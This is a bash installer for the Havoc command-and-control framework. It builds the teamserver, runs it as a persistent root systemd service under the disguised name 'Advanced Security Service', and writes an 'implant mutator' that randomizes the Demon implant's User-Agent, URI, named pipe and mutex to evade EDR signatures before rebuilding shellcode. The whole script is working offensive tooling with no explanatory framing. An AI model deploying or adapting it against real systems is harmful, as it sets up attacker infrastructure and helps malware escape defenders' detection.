#!/bin/bash
# Enhanced Havoc C2 Framework installer optimized for Red Team Operations
# This script installs and configures Havoc with EDR evasion features
# The mutation features are applied BEFORE building to ensure proper compilation

set -e
TEMP_DIR=$(mktemp -d)
LOG_FILE="/root/Tools/havoc_installer.log"
HAVOC_DIR="/root/Tools/Havoc"
HAVOC_DATA_DIR="/root/Tools/Havoc/data"
COMPILER_URL="http://musl.cc/x86_64-w64-mingw32-cross.tgz"
COMPILER_DIR="/usr/bin/x86_64-w64-mingw32-cross"
COMPILER_PATH="$COMPILER_DIR/bin/x86_64-w64-mingw32-gcc"
IMPLANT_MUTATOR_SCRIPT="$HAVOC_DIR/implant_mutator.sh"
HAVOC_GITHUB="https://github.com/HavocFramework/Havoc.git"

# Function to log messages
log() {
    echo "[$(date +"%Y-%m-%d %H:%M:%S")] $1" | tee -a $LOG_FILE
}

# Function to generate random strings
random_string() {
    local length=${1:-16}
    cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w $length | head -n 1
}

# Generate random build ID for implant signature
RANDOMIZED_BUILD_ID=$(random_string 16)

# Install required dependencies
log "Installing dependencies..."
apt-get update >/dev/null 2>&1
apt-get install -y git build-essential apt-utils cmake libfontconfig1 libglu1-mesa-dev libgtest-dev libspdlog-dev libboost-all-dev libncurses5-dev libgdbm-dev libssl-dev libreadline-dev libffi-dev libsqlite3-dev libbz2-dev mesa-common-dev qtbase5-dev qtchooser qt5-qmake qtbase5-dev-tools libqt5websockets5 libqt5websockets5-dev qtdeclarative5-dev golang-go qtbase5-dev libqt5websockets5-dev python3-dev libboost-all-dev mingw-w64 nasm >/dev/null 2>&1

# Fix for JSON dependency
log "Installing nlohmann-json manually..."
mkdir -p /tmp/json
cd /tmp/json
wget -q https://github.com/nlohmann/json/releases/download/v3.11.2/json.hpp
mkdir -p /usr/include/nlohmann
cp json.hpp /usr/include/nlohmann/
cd - > /dev/null

# Setup Go environment
log "Setting up Go environment..."
mkdir -p /root/go
export GOPATH=/root/go
export PATH=$PATH:/usr/local/go/bin:$GOPATH/bin

# Download and install compiler fix
log "Downloading and installing fixed compiler..."
if [ ! -d "$COMPILER_DIR" ]; then
    # Download the compiler
    wget -q -O /tmp/compiler.tgz $COMPILER_URL
    
    # Extract to /usr/bin
    tar -xzf /tmp/compiler.tgz -C /usr/bin
    
    # Verify compiler exists
    if [ -f "$COMPILER_PATH" ]; then
        log "Compiler installed successfully at $COMPILER_PATH"
        chmod +x $COMPILER_PATH
    else
        log "Error: Compiler installation failed. File not found at $COMPILER_PATH"
    fi
    
    # Clean up
    rm -f /tmp/compiler.tgz
else
    log "Compiler already installed at $COMPILER_DIR"
fi

# Clone Havoc repository
log "Cloning Havoc repository..."
if [ -d "$HAVOC_DIR" ]; then
    log "Havoc directory already exists, updating..."
    cd $HAVOC_DIR
    git pull
else
    # Clone with proper GitHub URL
    git clone --quiet -b dev $HAVOC_GITHUB $HAVOC_DIR
    cd $HAVOC_DIR
fi

# Create data directories
mkdir -p $HAVOC_DATA_DIR
mkdir -p $HAVOC_DIR/payloads
mkdir -p $HAVOC_DIR/payloads/backup

# Initialize submodules
log "Initializing submodules..."
cd $HAVOC_DIR
git submodule init
git submodule update --recursive

# Create improved implant mutator script BEFORE building
log "Creating implant mutator script..."
cat > "$IMPLANT_MUTATOR_SCRIPT" << 'EOF'
#!/bin/bash
# === CONFIG ===
IMPLANT_DIR="$HOME/Tools/havoc/payloads/Demon"
SRC_DIR="$IMPLANT_DIR/src"
BUILD_ROOT="$HOME/Tools/havoc"
OUTPUT_FILE="$HOME/Tools/havoc/payloads/Shellcode.x64.bin"
BACKUP_DIR="$HOME/Tools/havoc/payloads/backup"
TIMESTAMP=$(date +"%Y%m%d_%H%M%S")
# === COLORS ===
YELLOW='\033[1;33m'
GREEN='\033[1;32m'
NC='\033[0m'
echo -e "${YELLOW}[+] Starting Havoc implant mutation...${NC}"
# === 1. Backup Previous Shellcode ===
mkdir -p "$BACKUP_DIR"
if [[ -f "$OUTPUT_FILE" ]]; then
cp "$OUTPUT_FILE" "$BACKUP_DIR/implant_$TIMESTAMP.raw"
echo -e "${GREEN}[*] Previous shellcode backed up to: implant_$TIMESTAMP.raw${NC}"
else
echo -e "${YELLOW}[!] No previous shellcode found to back up.${NC}"
fi
# === 2. Generate Random Identifiers ===
random_str() {
tr -dc A-Za-z0-9 </dev/urandom | head -c 12
}
UA=$(random_str)
URI=$(random_str)
PIPE=$(random_str)
MUTEX=$(random_str)
# === 3. Mutate TransportHttp.c ===
THTTP="$SRC_DIR/core/TransportHttp.c"
if [[ -f "$THTTP" ]]; then
sed -i "s/User-Agent: .*/User-Agent: ${UA}\\r\\n\";/" "$THTTP"
sed -i "s|/stage|/${URI}|g" "$THTTP"
echo -e "${GREEN}[*] Replaced User-Agent with '${UA}' and URI path with '/${URI}'${NC}"
else
echo -e "${YELLOW}[!] TransportHttp.c not found. Skipping User-Agent/URI mutation.${NC}"
fi
# === 4. Mutate Named Pipe and Mutex ===
TARGET_FILE=""
for f in "$SRC_DIR/core/Runtime.c" "$SRC_DIR/main/MainExe.c"; do
if [[ -f "$f" ]]; then
TARGET_FILE="$f"
break
fi
done
if [[ -n "$TARGET_FILE" ]]; then
sed -i "s|\\\\\\\\.\\\\pipe\\\\[a-zA-Z0-9_]*|\\\\\\\\.\\\\pipe\\\\${PIPE}|g" "$TARGET_FILE"
sed -i "s|Mutex_[a-zA-Z0-9_]*|Mutex_${MUTEX}|g" "$TARGET_FILE"
echo -e "${GREEN}[*] Randomized named pipe: \\\\.\\pipe\\${PIPE}${NC}"
echo -e "${GREEN}[*] Randomized mutex: Mutex_${MUTEX}${NC}"
else
echo -e "${YELLOW}[!] No config file found to mutate mutex/pipe.${NC}"
fi
# === 5. Rebuild Implant via Top-Level Makefile ===
echo -e "${YELLOW}[+] Rebuilding Havoc payload from top-level makefile...${NC}"
cd "$BUILD_ROOT" || exit 1
make clean && make
# === 6. Confirm Shellcode Output ===
if [[ -f "$OUTPUT_FILE" ]]; then
echo -e "${GREEN}[+] Success! New shellcode generated: $OUTPUT_FILE${NC}"
else
echo -e "${YELLOW}[!] Build failed or shellcode was not generated.${NC}"
exit 1
fi
EOF

chmod +x "$IMPLANT_MUTATOR_SCRIPT"

# Perform mutations BEFORE building - this is critical
# log "Running implant mutations script before building..."
# if [ -d "$HAVOC_DIR/payloads/Demon" ]; then
#     $IMPLANT_MUTATOR_SCRIPT
#     if [ $? -ne 0 ]; then
#         log "Warning: Implant mutation script ran with errors, but continuing build..."
#     fi
# else
#     log "Skipping implant mutations as Demon directory not found yet. Will be applied after build."
# fi

# Install additional Go dependencies for the teamserver
log "Installing Go dependencies for teamserver..."
cd $HAVOC_DIR/teamserver
go mod download golang.org/x/sys
cd $HAVOC_DIR

# Build Havoc using make - build teamserver first
log "Building Havoc teamserver..."
cd $HAVOC_DIR
make ts-build

# Build Havoc client
#log "Building Havoc client..."
#make client-build

# Create systemd service for Havoc
log "Creating systemd service for Havoc teamserver..."
cat > /etc/systemd/system/havoc.service << EOF
[Unit]
Description=Advanced Security Service
After=network.target

[Service]
Type=simple
User=root
Group=root
WorkingDirectory=$HAVOC_DIR/teamserver
ExecStart=$HAVOC_DIR/havoc server -d
Restart=always
RestartSec=10

# Security measures
PrivateTmp=true
ProtectHome=false
NoNewPrivileges=true

[Install]
WantedBy=multi-user.target
EOF

# Set proper permissions
log "Setting proper permissions..."
chmod -R 755 $HAVOC_DIR

# Create symlinks to executables in /usr/local/bin
ln -sf $HAVOC_DIR/havoc /usr/local/bin/havoc
ln -sf $IMPLANT_MUTATOR_SCRIPT /usr/local/bin/havoc-mutate

# Enable and start Havoc service
log "Enabling and starting Havoc service..."
systemctl daemon-reload
systemctl enable havoc
systemctl start havoc

log "Havoc C2 installation completed successfully!"